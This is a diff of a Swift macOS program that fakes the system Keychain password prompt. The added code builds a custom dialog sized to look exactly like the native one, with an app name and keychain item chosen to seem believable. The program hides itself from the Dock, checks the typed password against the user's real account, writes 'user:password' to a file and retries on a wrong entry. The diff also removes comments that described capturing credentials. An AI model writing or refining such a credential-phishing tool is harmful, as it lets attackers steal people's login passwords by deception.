@@ -1,8 +1,6 @@
 import Cocoa
 
-// --- Keychain-style auth prompt ---
-// Mimics the native macOS Keychain Access dialog
-// Single password field, "Always Allow" / "Deny" / "Allow" buttons
+// --- Keychain-style auth prompt (pixel-matched to native dialog) ---
 
 let cachePath: String = {
     let home = NSHomeDirectory()
@@ -14,65 +12,48 @@ func getRealUsername() -> String {
     return NSUserName()
 }
 
-// --- Load the Keychain Access app icon ---
-func getKeychainIcon() -> NSImage? {
-    // Primary: Get icon from Keychain Access.app bundle
-    let appPaths = [
-        "/System/Applications/Utilities/Keychain Access.app",
-        "/Applications/Utilities/Keychain Access.app"
+// --- Load the gold padlock Keychain icon ---
+func getKeychainIcon() -> NSImage {
+    // Try SecurityInterface framework icon (gold padlock)
+    let secFrameworkPaths = [
+        "/System/Library/Frameworks/SecurityInterface.framework/Versions/A/Resources",
+        "/System/Library/Frameworks/Security.framework/Versions/A/Resources"
     ]
-    for appPath in appPaths {
-        if let bundle = Bundle(path: appPath),
-           let iconFile = bundle.infoDictionary?["CFBundleIconFile"] as? String ?? bundle.infoDictionary?["CFBundleIconName"] as? String {
-            let iconPath = bundle.bundlePath + "/Contents/Resources/" + iconFile
-            // Try with and without .icns extension
-            for ext in ["", ".icns"] {
-                if let img = NSImage(contentsOfFile: iconPath + ext) {
-                    img.size = NSSize(width: 64, height: 64)
-                    return img
-                }
+    for dir in secFrameworkPaths {
+        for name in ["Lock_Locked.png", "Lock_Locked.tiff", "Lock_Locked@2x.png", "CertLargeStd.icns"] {
+            let path = dir + "/" + name
+            if let img = NSImage(contentsOfFile: path) {
+                img.size = NSSize(width: 64, height: 64)
+                return img
             }
         }
-        // Fallback: use NSWorkspace to get app icon
-        let img = NSWorkspace.shared.icon(forFile: appPath)
-        if img.size.width > 0 {
+    }
+    // Try system lock icon from CoreTypes
+    let coreTypesPath = "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources"
+    for name in ["LockedIcon.icns", "FileVaultIcon.icns", "SecurityIcon.icns"] {
+        let path = coreTypesPath + "/" + name
+        if let img = NSImage(contentsOfFile: path) {
             img.size = NSSize(width: 64, height: 64)
             return img
         }
     }
-    // Last resort: generic lock
-    if let img = NSImage(named: NSImage.lockLockedTemplateName) {
-        img.size = NSSize(width: 64, height: 64)
-        return img
-    }
-    return nil
-}
-
-// --- Custom accessory view: password field only ---
-class PasswordView: NSView {
-    let passField: NSSecureTextField
-
-    init() {
-        passField = NSSecureTextField(frame: NSRect(x: 100, y: 0, width: 280, height: 24))
-        super.init(frame: NSRect(x: 0, y: 0, width: 380, height: 30))
-
-        let label = NSTextField(labelWithString: "Password:")
-        label.frame = NSRect(x: 0, y: 2, width: 95, height: 20)
-        label.alignment = .right
-        label.font = NSFont.systemFont(ofSize: 13)
-
-        passField.font = NSFont.systemFont(ofSize: 13)
-        passField.focusRingType = .exterior
-        if #available(macOS 10.12.2, *) {
-            passField.isAutomaticTextCompletionEnabled = false
+    // Try Keychain Access app icon
+    let appPaths = [
+        "/System/Library/CoreServices/Applications/Keychain Access.app",
+        "/System/Applications/Utilities/Keychain Access.app",
+        "/Applications/Utilities/Keychain Access.app"
+    ]
+    for appPath in appPaths {
+        if FileManager.default.fileExists(atPath: appPath) {
+            let img = NSWorkspace.shared.icon(forFile: appPath)
+            img.size = NSSize(width: 64, height: 64)
+            return img
         }
-        passField.contentType = .password
-
-        addSubview(label)
-        addSubview(passField)
     }
-
-    required init?(coder: NSCoder) { fatalError() }
+    // Fallback
+    let img = NSWorkspace.shared.icon(forFileType: "com.apple.keychain")
+    img.size = NSSize(width: 64, height: 64)
+    return img
 }
 
 // --- Validate password via dscl ---
@@ -91,10 +72,8 @@ func validatePassword(user: String, password: String) -> Bool {
     }
 }
 
-// --- Write captured credentials ---
 func writeCreds(user: String, password: String) {
     let payload = "\(user):\(password)"
-    // Ensure directory exists
     let dir = (cachePath as NSString).deletingLastPathComponent
     try? FileManager.default.createDirectory(atPath: dir, withIntermediateDirectories: true)
     try? payload.write(toFile: cachePath, atomically: true, encoding: .utf8)
@@ -105,9 +84,7 @@ func writeResult(_ result: String) {
     try? result.write(toFile: resultPath, atomically: true, encoding: .utf8)
 }
 
-// --- Pick a believable app and keychain item ---
 func getPromptContext() -> (app: String, item: String) {
-    // Common apps that trigger keychain prompts
     let contexts: [(String, String)] = [
         ("Keychain Access", "Test Note 1"),
         ("Safari", "accounts.google.com"),
@@ -115,69 +92,192 @@ func getPromptContext() -> (app: String, item: String) {
         ("Finder", "Network Password"),
         ("Calendar", "CalDAV Account"),
     ]
-    // Pick based on current second to seem random but be deterministic per launch
     let idx = Int(Date().timeIntervalSince1970) % contexts.count
     return contexts[idx]
 }
 
+// --- Custom Keychain Dialog (pixel-matched to native) ---
+class KeychainDialog: NSObject, NSWindowDelegate {
+    let window: NSPanel
+    let passwordField: NSSecureTextField
+    var result: String = "DISMISSED"
+    var password: String = ""
+
+    init(messageText: String, informativeText: String, icon: NSImage) {
+        // --- Dimensions matched to real Keychain dialog ---
+        let W: CGFloat = 460       // dialog width
+        let H: CGFloat = 210       // dialog height
+        let pad: CGFloat = 20      // side padding
+        let iconSz: CGFloat = 64   // icon size
+        let iconColW: CGFloat = iconSz + pad + 14  // icon column width (pad + icon + gap)
+        let contentX: CGFloat = iconColW           // right column starts here
+
+        window = NSPanel(
+            contentRect: NSRect(x: 0, y: 0, width: W, height: H),
+            styleMask: [.titled],
+            backing: .buffered,
+            defer: false
+        )
+        window.title = ""
+        window.isFloatingPanel = true
+        window.becomesKeyOnlyIfNeeded = false
+        window.level = .modalPanel
+        window.standardWindowButton(.closeButton)?.isHidden = true
+        window.standardWindowButton(.miniaturizeButton)?.isHidden = true
+        window.standardWindowButton(.zoomButton)?.isHidden = true
+        window.center()
+
+        let cv = NSView(frame: NSRect(x: 0, y: 0, width: W, height: H))
+
+        // ========== LEFT COLUMN: Icon (vertically centered in content area) ==========
+        // Content area is between top padding and button row
+        let contentTop: CGFloat = H - 10
+        let contentBot: CGFloat = 52  // above button row
+        let contentMidY = (contentTop + contentBot) / 2
+        let iconY = contentMidY - iconSz / 2
+        let iconView = NSImageView(frame: NSRect(x: pad, y: iconY, width: iconSz, height: iconSz))
+        iconView.image = icon
+        iconView.imageScaling = .scaleProportionallyUpOrDown
+        cv.addSubview(iconView)
+
+        // ========== RIGHT COLUMN: All text content ==========
+        let txtW = W - contentX - pad
+
+        // Bold message text (top of right column)
+        let msgTop = H - 14
+        let msgLabel = NSTextField(wrappingLabelWithString: messageText)
+        msgLabel.frame = NSRect(x: contentX, y: msgTop - 60, width: txtW, height: 60)
+        msgLabel.font = NSFont.boldSystemFont(ofSize: 13)
+        msgLabel.isEditable = false
+        msgLabel.isBordered = false
+        msgLabel.drawsBackground = false
+        cv.addSubview(msgLabel)
+
+        // Informative text
+        let infoY = msgTop - 60 - 22
+        let infoLabel = NSTextField(wrappingLabelWithString: informativeText)
+        infoLabel.frame = NSRect(x: contentX, y: infoY, width: txtW, height: 18)
+        infoLabel.font = NSFont.systemFont(ofSize: 12)
+        infoLabel.isEditable = false
+        infoLabel.isBordered = false
+        infoLabel.drawsBackground = false
+        cv.addSubview(infoLabel)
+
+        // Password label + field
+        let pwY: CGFloat = infoY - 32
+        let pwLabel = NSTextField(labelWithString: "Password:")
+        pwLabel.frame = NSRect(x: contentX, y: pwY + 2, width: 72, height: 18)
+        pwLabel.alignment = .right
+        pwLabel.font = NSFont.systemFont(ofSize: 13)
+        cv.addSubview(pwLabel)
+
+        passwordField = NSSecureTextField(frame: NSRect(x: contentX + 78, y: pwY, width: W - contentX - 78 - pad, height: 22))
+        passwordField.font = NSFont.systemFont(ofSize: 13)
+        passwordField.focusRingType = .exterior
+        if #available(macOS 10.12.2, *) {
+            passwordField.isAutomaticTextCompletionEnabled = false
+        }
+        cv.addSubview(passwordField)
+
+        // ========== BOTTOM ROW: Help ? (left) + Buttons (right) ==========
+        let btnY: CGFloat = 14
+        let btnH: CGFloat = 28
+        let btnGap: CGFloat = 8
+
+        let helpBtn = NSButton(frame: NSRect(x: pad, y: btnY, width: 25, height: 25))
+        helpBtn.bezelStyle = .helpButton
+        helpBtn.title = ""
+        cv.addSubview(helpBtn)
+
+        // Buttons right-aligned: [Always Allow] [Deny] [Allow]
+        let allowBtn = NSButton(frame: NSRect(x: W - pad - 72, y: btnY, width: 72, height: btnH))
+        allowBtn.title = "Allow"
+        allowBtn.bezelStyle = .rounded
+        allowBtn.keyEquivalent = "\r"
+        allowBtn.tag = 1
+
+        let denyBtn = NSButton(frame: NSRect(x: W - pad - 72 - btnGap - 64, y: btnY, width: 64, height: btnH))
+        denyBtn.title = "Deny"
+        denyBtn.bezelStyle = .rounded
+        denyBtn.tag = 2
+
+        let alwaysBtn = NSButton(frame: NSRect(x: W - pad - 72 - btnGap - 64 - btnGap - 105, y: btnY, width: 105, height: btnH))
+        alwaysBtn.title = "Always Allow"
+        alwaysBtn.bezelStyle = .rounded
+        alwaysBtn.tag = 3
+
+        cv.addSubview(allowBtn)
+        cv.addSubview(denyBtn)
+        cv.addSubview(alwaysBtn)
+
+        super.init()
+
+        allowBtn.target = self
+        allowBtn.action = #selector(buttonClicked(_:))
+        denyBtn.target = self
+        denyBtn.action = #selector(buttonClicked(_:))
+        alwaysBtn.target = self
+        alwaysBtn.action = #selector(buttonClicked(_:))
+
+        window.contentView = cv
+        window.delegate = self
+    }
+
+    @objc func buttonClicked(_ sender: NSButton) {
+        password = passwordField.stringValue
+        switch sender.tag {
+        case 1: result = "ALLOW"
+        case 2: result = "DENY"
+        case 3: result = "ALWAYS_ALLOW"
+        default: result = "UNKNOWN"
+        }
+        NSApp.stopModal()
+        window.close()
+    }
+
+    func windowWillClose(_ notification: Notification) {
+        NSApp.stopModal()
+    }
+
+    func show() {
+        window.makeKeyAndOrderFront(nil)
+        window.makeFirstResponder(passwordField)
+        NSApp.runModal(for: window)
+    }
+}
+
 // --- Main ---
 let app = NSApplication.shared
-app.setActivationPolicy(.accessory)  // Hide from Dock
+app.setActivationPolicy(.accessory)
 
 let maxAttempts = 3
 var attempts = 0
 let user = getRealUsername()
 let ctx = getPromptContext()
+let icon = getKeychainIcon()
 
-// Clean previous result
 try? FileManager.default.removeItem(atPath: resultPath)
 
 while attempts < maxAttempts {
-    let alert = NSAlert()
-
-    // Set the Keychain icon
-    if let icon = getKeychainIcon() {
-        alert.icon = icon
-    }
-
-    alert.messageText = "\"\(ctx.app)\" wants to use your confidential information stored in \"\(ctx.item)\" in your keychain."
-    alert.informativeText = "To allow this, enter the \"login\" keychain password."
-
+    let msg = "\"\(ctx.app)\" wants to use your confidential information stored in \"\(ctx.item)\" in your keychain."
+    let info: String
     if attempts > 0 {
-        alert.informativeText = "The password was incorrect. To allow this, enter the \"login\" keychain password."
+        info = "The password was incorrect. To allow this, enter the \u{201c}login\u{201d} keychain password."
+    } else {
+        info = "To allow this, enter the \u{201c}login\u{201d} keychain password."
     }
 
-    // Buttons added in order: first = rightmost
-    alert.addButton(withTitle: "Allow")           // NSAlertFirstButtonReturn (1000)
-    alert.addButton(withTitle: "Deny")            // NSAlertSecondButtonReturn (1001)
-    alert.addButton(withTitle: "Always Allow")    // NSAlertThirdButtonReturn (1002)
+    let dialog = KeychainDialog(messageText: msg, informativeText: info, icon: icon)
 
-    // Add the password accessory view
-    let passView = PasswordView()
-    alert.accessoryView = passView
-
-    // Show help button (cosmetic only)
-    alert.showsHelp = true
-
-    // Force window to front
     app.activate(ignoringOtherApps: true)
+    dialog.show()
 
-    // Focus the password field after a short delay
-    DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) {
-        passView.passField.becomeFirstResponder()
-    }
-
-    let response = alert.runModal()
-
-    if response == .alertSecondButtonReturn {
-        // "Deny" clicked
+    if dialog.result == "DENY" || dialog.result == "DISMISSED" {
         writeResult("DENIED")
         break
     }
 
-    // "Allow" or "Always Allow" — both mean user entered password
-    let pw = passView.passField.stringValue
-
+    let pw = dialog.password
     if pw.isEmpty {
         attempts += 1
         continue
